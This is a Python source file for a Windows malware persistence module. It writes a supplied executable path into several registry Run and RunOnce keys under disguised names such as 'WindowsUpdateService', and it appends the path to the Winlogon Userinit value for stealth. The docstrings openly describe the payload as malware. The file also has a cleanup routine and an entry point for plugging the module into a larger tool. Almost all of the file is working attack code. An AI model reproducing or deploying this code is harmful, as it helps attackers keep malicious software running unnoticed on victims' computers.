"""
Persistence Module: Registry Run Keys
Developer: Chut Homey
Purpose: Establish persistence via Windows Registry Run keys

Project Spec: "Registry Run Key: Adding an entry to 
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run for persistence on login."
"""

import winreg
import sys
import platform


class RegistryPersistence:
    """
    Implements Registry Run Key persistence technique
    Adds malware to auto-start locations in Windows Registry
    """
    
    def __init__(self, malware_path):
        self.malware_path = malware_path
        self.added_entries = []
    
    def add_run_key_persistence(self):
        """
        Main method: Add malware to multiple Registry Run locations
        """
        print("[REGISTRY] Setting up Registry Run Key persistence...")
        
        # Define registry locations for persistence
        persistence_locations = [
            # Primary user Run key (most reliable)
            {
                'hive': winreg.HKEY_CURRENT_USER,
                'path': r"Software\Microsoft\Windows\CurrentVersion\Run",
                'name': "WindowsUpdateService"
            },
            # RunOnce (executes once on next login)
            {
                'hive': winreg.HKEY_CURRENT_USER, 
                'path': r"Software\Microsoft\Windows\CurrentVersion\RunOnce",
                'name': "SystemHealthCheck"
            },
            # Alternative user location
            {
                'hive': winreg.HKEY_CURRENT_USER,
                'path': r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run",
                'name': "SecurityMonitor"
            }
        ]
        
        success_count = 0
        
        for location in persistence_locations:
            if self._add_registry_entry(
                location['hive'], 
                location['path'], 
                location['name']
            ):
                success_count += 1
        
        print(f"[REGISTRY] Added {success_count}/{len(persistence_locations)} registry entries")
        return success_count > 0
    
    def _add_registry_entry(self, hive, key_path, value_name):
        """
        Add a single registry entry for persistence
        """
        try:
            # Try to open existing key, create if doesn't exist
            try:
                key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE | winreg.KEY_WRITE)
            except FileNotFoundError:
                key = winreg.CreateKey(hive, key_path)
            
            # Set the registry value to point to our malware
            winreg.SetValueEx(
                key,
                value_name,      # Disguised name
                0,              # Reserved
                winreg.REG_SZ,  # String type
                self.malware_path
            )
            
            winreg.CloseKey(key)
            
            # Verify the entry was added
            if self._verify_registry_entry(hive, key_path, value_name):
                self.added_entries.append((hive, key_path, value_name))
                print(f"  [SUCCESS] Added: {key_path}\\{value_name}")
                return True
            else:
                print(f"  [FAILED] Verification failed: {key_path}\\{value_name}")
                return False
                
        except Exception as e:
            print(f"  [ERROR] Failed to add {key_path}: {e}")
            return False
    
    def _verify_registry_entry(self, hive, key_path, value_name):
        """
        Verify that registry entry was successfully added
        """
        try:
            key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ)
            value, reg_type = winreg.QueryValueEx(key, value_name)
            winreg.CloseKey(key)
            
            # Check if value matches our malware path
            if value == self.malware_path and reg_type == winreg.REG_SZ:
                return True
        except Exception:
            pass
        
        return False
    
    def add_stealth_registry_locations(self):
        """
        Advanced: Add to less monitored registry locations
        """
        print("[REGISTRY] Adding stealth registry entries...")
        
        stealth_locations = [
            # Winlogon Userinit - very stealthy
            {
                'hive': winreg.HKEY_LOCAL_MACHINE,
                'path': r"Software\Microsoft\Windows NT\CurrentVersion\Winlogon",
                'name': "Userinit",
                'append': True  # Append to existing value
            }
        ]
        
        for location in stealth_locations:
            try:
                key = winreg.OpenKey(location['hive'], location['path'], 0, 
                                   winreg.KEY_SET_VALUE | winreg.KEY_READ)
                
                if location.get('append'):
                    # Get existing value and append our malware
                    try:
                        existing_value, reg_type = winreg.QueryValueEx(key, location['name'])
                        new_value = f"{existing_value},{self.malware_path}"
                    except FileNotFoundError:
                        new_value = self.malware_path
                else:
                    new_value = self.malware_path
                
                winreg.SetValueEx(key, location['name'], 0, winreg.REG_SZ, new_value)
                winreg.CloseKey(key)
                
                self.added_entries.append((location['hive'], location['path'], location['name']))
                print(f"  [STEALTH] Added to: {location['path']}\\{location['name']}")
                
            except Exception as e:
                print(f"  [ERROR] Stealth registry failed: {e}")
    
    def cleanup(self):
        """
        Remove all registry entries added by this class
        """
        print("[REGISTRY] Cleaning up registry entries...")
        
        removed_count = 0
        for hive, key_path, value_name in self.added_entries:
            try:
                key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, value_name)
                winreg.CloseKey(key)
                print(f"  [REMOVED] {key_path}\\{value_name}")
                removed_count += 1
            except Exception as e:
                print(f"  [ERROR] Failed to remove {value_name}: {e}")
        
        print(f"[REGISTRY] Removed {removed_count} registry entries")

# Standalone test function
def test_registry_persistence():
    """
    Test function for Registry Persistence technique
    """
    print("🔧 TESTING REGISTRY PERSISTENCE TECHNIQUE")
    print("=" * 50)
    
    # Use current script as test malware
    test_malware = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
    
    # Create persistence manager
    rp = RegistryPersistence(test_malware)
    
    # Test basic registry persistence
    success = rp.add_run_key_persistence()
    
    # Test stealth locations (requires admin)
    try:
        rp.add_stealth_registry_locations()
    except Exception as e:
        print(f"[INFO] Stealth locations require admin: {e}")
    
    print(f"\n📊 RESULT: Registry Persistence - {'SUCCESS' if success else 'FAILED'}")
    
    # Cleanup
    input("\nPress Enter to cleanup...")
    rp.cleanup()

# Entry point function for integration
def establish_registry_persistence(malware_path=None):
    """
    Establish registry persistence - entry point for integration
    
    Args:
        malware_path: Path to malware executable (default: current script)
    
    Returns:
        bool: True if persistence established successfully
    """
    if platform.system() != "Windows":
        print("[!] Registry persistence only works on Windows")
        return False
    
    if malware_path is None:
        malware_path = sys.executable if hasattr(sys, 'frozen') else sys.argv[0]
    
    rp = RegistryPersistence(malware_path)
    return rp.add_run_key_persistence()


if __name__ == "__main__":
    test_registry_persistence()